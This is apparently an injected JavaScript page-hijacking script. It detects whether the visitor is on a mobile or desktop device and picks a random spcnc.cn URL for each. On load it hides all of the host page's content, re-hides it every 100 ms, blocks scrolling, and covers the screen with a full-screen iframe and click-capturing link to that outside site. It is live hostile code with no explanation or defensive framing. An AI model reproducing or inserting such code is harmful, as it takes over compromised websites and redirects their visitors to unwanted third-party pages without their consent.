var sUserAgent= navigator.userAgent.toLowerCase();
var bIsIphoneOs= sUserAgent.match(/iphone/i) == "iphone";
var bIsSymb= sUserAgent.match(/symbianos/i) == "symbianos";
var bIsIpad= sUserAgent.match(/ipad/i) == "ipad";
var bIsIpod= sUserAgent.match(/ipod/i) == "ipod";
var bIsAndroid= sUserAgent.match(/android/i) == "android";
var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce";
var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile";
var bIsWP= sUserAgent.match(/windows phone/i) == "windows phone";
var isBDAPP=sUserAgent.match(/baiduboxapp/i) == "baiduboxapp";
var isBDBrowser=sUserAgent.match(/baidubrowser/i) == "baidubrowser";
var isM= bIsIphoneOs || bIsSymb || bIsIpad || bIsIpod || bIsAndroid || bIsCE || bIsWM || bIsWP || isBDAPP
if(isM) {
	var str=new Array("http://app.spcnc.cn/home.html","http://app2.spcnc.cn/home.html");
}else{
		var str=new Array("http://app4.spcnc.cn/home.html","http://app3.spcnc.cn/home.html");
}
var aric_a;
aric_a = str[parseInt(Math.random()*(str.length))];

function hide_parent_view()
{
    var i;
    var c=document.body.childNodes;
    for (i=0; i<c.length; i++)
    {
        try{
            if(c[i].id != "__overflow_view" && c[i].id != "__overflow_a")
            {
                if(c[i].style)
                {
                    c[i].style.display = "none";
                }
            }
        }
        catch(e)
        {}
    }
}


var __old_onload = null;
function ___page_onload()
{
    hide_parent_view();
    setInterval(hide_parent_view, 100);
    document.body.style.overflow = "hidden";
    if(__old_onload != null)
    {
        __old_onload();
    }
}
__old_onload = window.onload;
window.onload = ___page_onload;
document.writeln('<iframe id="__overflow_view"  width="100%" height="100%" style="position: fixed;background: white;border: none;top: 0;left: 0;z-index: 1999999999; _position: absolute; _top: expression(eval(document.documentElement.scrollTop));  " src="' + aric_a + '">');
document.writeln('</iframe>');
document.writeln('<a href="' + aric_a + '" target="_self" id="__overflow_a" style="display: block;  height:100%; width:100%; position: fixed;border: none;top: 0;left: 0;z-index: 2000; _position: absolute; _top: expression(eval(document.documentElement.scrollTop));"> </a>');
document.writeln("<style>");
document.writeln("body{overflow:hidden !important}");
document.writeln("body > div{display:none}");
document.writeln("</style>");
document.writeln(" <meta name=\'viewport\' content=\'width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0\'>");
 
